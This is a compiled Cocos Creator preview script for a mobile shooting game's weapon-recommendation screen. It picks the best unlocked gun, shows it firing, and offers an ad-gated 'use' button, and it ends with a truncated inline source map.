O1xyXG4gICAgICAgICAgICB9KTtcclxuICAgICAgICB9XHJcbiAgICB9XHJcblxyXG59XHJcbiJdfQ==
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/home/RecommendController.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '14d59qg1Z9N5JJ+Z0KRq+TC', 'RecommendController');
// script/app/home/RecommendController.ts

Object.defineProperty(exports, "__esModule", { value: true });
var BulletEmitterShouQiang_1 = require("../entities/bulletEmitter/BulletEmitterShouQiang");
var BulletEmitterJuJiQiang_1 = require("../entities/bulletEmitter/BulletEmitterJuJiQiang");
var BulletEmitterJiaTeLin_1 = require("../entities/bulletEmitter/BulletEmitterJiaTeLin");
var BulletEmitterJiGuang_1 = require("../entities/bulletEmitter/BulletEmitterJiGuang");
var BulletEmitterHuoYan_1 = require("../entities/bulletEmitter/BulletEmitterHuoYan");
var BulletEmitterHuoJianTong_1 = require("../entities/bulletEmitter/BulletEmitterHuoJianTong");
var BulletEmitterLiZiPao_1 = require("../entities/bulletEmitter/BulletEmitterLiZiPao");
var BulletEmitterPenZi_1 = require("../entities/bulletEmitter/BulletEmitterPenZi");
var BulletEmitterSanDanQiang_1 = require("../entities/bulletEmitter/BulletEmitterSanDanQiang");
var BulletEmitterShanDianQiu_1 = require("../entities/bulletEmitter/BulletEmitterShanDianQiu");
var BulletEmitter_1 = require("../entities/bulletEmitter/BulletEmitter");
var Role_1 = require("../entities/role/Role");
var Actions_1 = require("../../../framework/actions/Actions");
var ExcelConfig_1 = require("../../../framework/config/ExcelConfig");
var ExcelTableNames_1 = require("../config/ExcelTableNames");
var World_1 = require("../info/World");
var Facade_1 = require("../../../framework/facade/Facade");
var HomeController_1 = require("./HomeController");
var GameProxy_1 = require("../game/GameProxy");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var RecommendController = /** @class */ (function (_super) {
    __extends(RecommendController, _super);
    function RecommendController() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.role = null;
        _this.useNode = null;
        _this.noUseNode = null;
        _this._fireCD = 0;
        _this._gunId = 1;
        return _this;
    }
    RecommendController.prototype.onLoad = function () {
        var _this = this;
        cc.game.on("video_3", function () {
            _this.onClickUseDo();
        }, this);
    };
    RecommendController.prototype.start = function () {
        var _this = this;
        this.noUseNode.on(cc.Node.EventType.POSITION_CHANGED, function () {
            _this.useNode.position = _this.noUseNode.position.add(cc.v2(0, 87));
        });
        var gameBulletsController = window['GameBulletsController'];
        gameBulletsController.bulletLayer.on(cc.Node.EventType.CHILD_ADDED, function (bulletNode) {
            bulletNode.group = "ui";
        });
        var bulletEmitter = null;
        var bulletEmitterType = 2;
        var weaponConfig = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.Weapon).filter(function (value) { return value['id'] != 1; }).sort((function (a, b) { return b['unlock'] - a['unlock']; }));
        for (var _i = 0, weaponConfig_1 = weaponConfig; _i < weaponConfig_1.length; _i++) {
            var item = weaponConfig_1[_i];
            if (World_1.World.Storage.gameLevel >= item['unlock']) {
                bulletEmitterType = item['id'];
                break;
            }
        }
        if (bulletEmitterType > 7) {
            bulletEmitterType = 7;
        }
        this._gunId = bulletEmitterType;
        var promises = [];
        promises.push(cc.loader.loadResAwait('prefab/entities/bullet/bullet' + bulletEmitterType));
        if (bulletEmitterType == BulletEmitter_1.default.TYPES.LiZiPao) {
            promises.push(cc.loader.loadResAwait('prefab/entities/bullet/bullet108'));
        }
        else if (bulletEmitterType == BulletEmitter_1.default.TYPES.HuoJianTong) {
            promises.push(cc.loader.loadResAwait('prefab/entities/explosive/explosive9'));
        }
        else if (bulletEmitterType == BulletEmitter_1.default.TYPES.JuJiQiang) {
            promises.push(cc.loader.loadResAwait('prefab/entities/bullet/fire7'));
        }
        Promise.all(promises).then(function () {
            switch (bulletEmitterType) {
                case BulletEmitter_1.default.TYPES.ShouQiang:
                    bulletEmitter = new BulletEmitterShouQiang_1.default(gameBulletsController);
                    break;
                case BulletEmitter_1.default.TYPES.PenZi:
                    bulletEmitter = new BulletEmitterPenZi_1.default(gameBulletsController);
                    break;
                case BulletEmitter_1.default.TYPES.JiaTeLin:
                    bulletEmitter = new BulletEmitterJiaTeLin_1.default(gameBulletsController);
                    break;
                case BulletEmitter_1.default.TYPES.SanDanQiang:
                    bulletEmitter = new BulletEmitterSanDanQiang_1.default(gameBulletsController);
                    break;
                case BulletEmitter_1.default.TYPES.JuJiQiang:
                    bulletEmitter = new BulletEmitterJuJiQiang_1.default(gameBulletsController);
                    break;
                case BulletEmitter_1.default.TYPES.LiZiPao:
                    bulletEmitter = new BulletEmitterLiZiPao_1.default(gameBulletsController);
                    break;
                case BulletEmitter_1.default.TYPES.HuoJianTong:
                    bulletEmitter = new BulletEmitterHuoJianTong_1.default(gameBulletsController);
                    break;
                case BulletEmitter_1.default.TYPES.ShanDianQiu:
                    bulletEmitter = new BulletEmitterShanDianQiu_1.default(gameBulletsController);
                    break;
                case BulletEmitter_1.default.TYPES.JiGuang:
                    bulletEmitter = new BulletEmitterJiGuang_1.default(gameBulletsController);
                    break;
                case BulletEmitter_1.default.TYPES.HuoYan:
                    bulletEmitter = new BulletEmitterHuoYan_1.default(gameBulletsController);
                    break;
            }
            bulletEmitter.init(bulletEmitterType);
            if (bulletEmitterType == BulletEmitter_1.default.TYPES.JiGuang) {
                var bullet_1 = bulletEmitter.gameBulletsController.getInactiveBullet(BulletEmitter_1.default.TYPES.JiGuang);
                bullet_1.collider.enabled = false;
                var ske_1 = bullet_1.getComponent(sp.Skeleton);
                ske_1.setStartListener(function (trackEntry, loopCount) {
                    var name = trackEntry.animation ? trackEntry.animation.name : '';
                    if (name === "jiguang") {
                        bullet_1.collider.enabled = true;
                    }
                });
                ske_1.setCompleteListener(function (trackEntry, loopCount) {
                    var name = trackEntry.animation ? trackEntry.animation.name : '';
                    if (name === "xuneng") {
                        ske_1.setAnimation(0, "jiguang", false);
                    }
                    else if (name === "jiguang") {
                        bulletEmitter.bulletCount--;
                        bullet_1.collider.enabled = false;
                        bullet_1.node.runAction(cc.sequence(cc.delayTime(0), cc.callFunc(function () {
                            if (!bullet_1.collider.enabled) {
                                bullet_1.node.active = false;
                            }
                        })));
                    }
                });
                bulletEmitter._bulletJiGuangSke = ske_1;
                bulletEmitter._bulletJiGuang = bullet_1;
                bulletEmitter._bulletJiGuang.node.rotation = _this.role.node.rotation;
                bulletEmitter._bulletJiGuang.node.position = _this.role.node.position.add(cc.v2(0, 1).rotate(cc.misc.degreesToRadians(-_this.role.node.rotation)).normalize().mul(_this.role.gunTopNode.y + 20));
            }
            var dir = cc.v2(0, 1000).sub(_this.role.node.position).normalize();
            _this.node.runAction(Actions_1.default.update(function (dt) {
                if (_this._fireCD > 0) {
                    _this._fireCD -= dt;
                }
                else {
                    _this._fireCD = bulletEmitter.interval;
                    if (bulletEmitterType == BulletEmitter_1.default.TYPES.JuJiQiang) {
                        var bulletStrikePrefab = cc.loader.getRes("prefab/entities/bullet/fire7");
                        var bulletStrikeNode_1 = cc.instantiate(bulletStrikePrefab);
                        gameBulletsController.bulletLayer.addChild(bulletStrikeNode_1, 0);
                        bulletStrikeNode_1.position = _this.role.node.position.add(dir.mul(_this.role.gunTopNode.y));
                        bulletStrikeNode_1.rotation = 90 - cc.misc.radiansToDegrees(Math.atan2(dir.y, dir.x));
                        bulletStrikeNode_1.getComponent(sp.Skeleton).setCompleteListener(function () {
                            bulletStrikeNode_1.destroy();
                        });
                    }
                    else if (bulletEmitterType !== BulletEmitter_1.default.TYPES.JiGuang && bulletEmitterType !== BulletEmitter_1.default.TYPES.PenZi) {
                        _this.role.fireSprite.node.scale = 1;
                        _this.role.fireSprite.node.active = true;
                        _this.role.fireSprite.node.runAction(cc.sequence(cc.scaleTo(0.05, 0.5), cc.callFunc(function () {
                            _this.role.fireSprite.node.active = false;
                        })));
                    }
                    bulletEmitter.fire(_this.role.node.position.add(dir.mul(_this.role.gunTopNode.y)), dir);
                }
            }));
        });
    };
    RecommendController.prototype.onClickUse = function (event, data) {
        console.log("【video】3 装备推荐【click】RecommendController Use");
        World_1.World.Storage._videoSign = 3;
        World_1.World.Storage.videoAd_show();
    };
    RecommendController.prototype.onClickUseDo = function () {
        GameProxy_1.GameProxy.prepareGun = this._gunId;
        Facade_1.default.findComponent("HomeScene", HomeController_1.default).playExit();
        this.node.destroy();
    };
    RecommendController.prototype.onClickNoUse = function (event, data) {
        console.log("【click】RecommendController NoUse");
        Facade_1.default.findComponent("HomeScene", HomeController_1.default).playExit();
        this.node.destroy();
    };
    __decorate([
        property(Role_1.default)
    ], RecommendController.prototype, "role", void 0);
    __decorate([
        property(cc.Node)
    ], RecommendController.prototype, "useNode", void 0);
    __decorate([
        property(cc.Node)
    ], RecommendController.prototype, "noUseNode", void 0);
    RecommendController = __decorate([
        ccclass
    ], RecommendController);
    return RecommendController;
}(cc.Component));
exports.default = RecommendController;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2hvbWUvUmVjb21tZW5kQ29udHJvbGxlci50cyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7O0FBQ0EsMkZBQXNGO0FBQ3RGLDJGQUFzRjtBQUN0Rix5RkFBb0Y7QUFDcEYsdUZBQWtGO0FBQ2xGLHFGQUFnRjtBQUNoRiwrRkFBMEY7QUFDMUYsdUZBQWtGO0FBQ2xGLG1GQUE4RTtBQUM5RSwrRkFBMEY7QUFDMUYsK0ZBQTBGO0FBQzFGLHlFQUFvRTtBQUNwRSw4Q0FBeUM7QUFDekMsOERBQXlEO0FBQ3pELHFFQUFrRTtBQUNsRSw2REFBMEQ7QUFDMUQsdUNBQW9DO0FBQ3BDLDJEQUFzRDtBQUN0RCxtREFBOEM7QUFDOUMsK0NBQTRDO0FBRXRDLElBQUEsS0FBc0IsRUFBRSxDQUFDLFVBQVUsRUFBbEMsT0FBTyxhQUFBLEVBQUUsUUFBUSxjQUFpQixDQUFDO0FBRzFDO0lBQWlELHVDQUFZO0lBQTdEO1FBQUEscUVBbUtDO1FBaEtHLFVBQUksR0FBUSxJQUFJLENBQUM7UUFHakIsYUFBTyxHQUFXLElBQUksQ0FBQztRQUd2QixlQUFTLEdBQVcsSUFBSSxDQUFDO1FBRWpCLGFBQU8sR0FBRyxDQUFDLENBQUM7UUFFWixZQUFNLEdBQUcsQ0FBQyxDQUFDOztJQXNKdkIsQ0FBQztJQXBKRyxvQ0FBTSxHQUFOO1FBQUEsaUJBSUM7UUFIRyxFQUFFLENBQUMsSUFBSSxDQUFDLEVBQUUsQ0FBQyxTQUFTLEVBQUM7WUFDakIsS0FBSSxDQUFDLFlBQVksRUFBRSxDQUFBO1FBQ3ZCLENBQUMsRUFBQyxJQUFJLENBQUMsQ0FBQztJQUNaLENBQUM7SUFFRCxtQ0FBSyxHQUFMO1FBQUEsaUJBeUhDO1FBeEhHLElBQUksQ0FBQyxTQUFTLENBQUMsRUFBRSxDQUFDLEVBQUUsQ0FBQyxJQUFJLENBQUMsU0FBUyxDQUFDLGdCQUFnQixFQUFFO1lBQ2xELEtBQUksQ0FBQyxPQUFPLENBQUMsUUFBUSxHQUFHLEtBQUksQ0FB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LENBQUM7SUFFRCwwQ0FBWSxHQUFaLFVBQWEsS0FBSyxFQUFFLElBQUk7UUFDcEIsT0FBTyxDQUFDLEdBQUcsQ0FBQyxrQ0FBa0MsQ0FBQyxDQUFBO1FBRS9DLGdCQUFNLENBQUMsYUFBYSxDQUFDLFdBQVcsRUFBRSx3QkFBYyxDQUFDLENBQUMsUUFBUSxFQUFFLENBQUM7UUFDN0QsSUFBSSxDQUFDLElBQUksQ0FBQyxPQUFPLEVBQUUsQ0FBQztJQUN4QixDQUFDO0lBL0pEO1FBREMsUUFBUSxDQUFDLGNBQUksQ0FBQztxREFDRTtJQUdqQjtRQURDLFFBQVEsQ0FBQyxFQUFFLENBQUMsSUFBSSxDQUFDO3dEQUNLO0lBR3ZCO1FBREMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxJQUFJLENBQUM7MERBQ087SUFUUixtQkFBbUI7UUFEdkMsT0FBTztPQUNhLG1CQUFtQixDQW1LdkM7SUFBRCwwQkFBQztDQW5LRCxBQW1LQyxDQW5LZ0QsRUFBRSxDQUFDLFNBQVMsR0FtSzVEO2tCQW5Lb0IsbUJBQW1CIiwiZmlsZSI6IiIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiXHJcbmltcG9ydCBCdWxsZXRFbWl0dGVyU2hvdVFpYW5nIGZyb20gXCIuLi9lbnRpdGllcy9idWxsZXR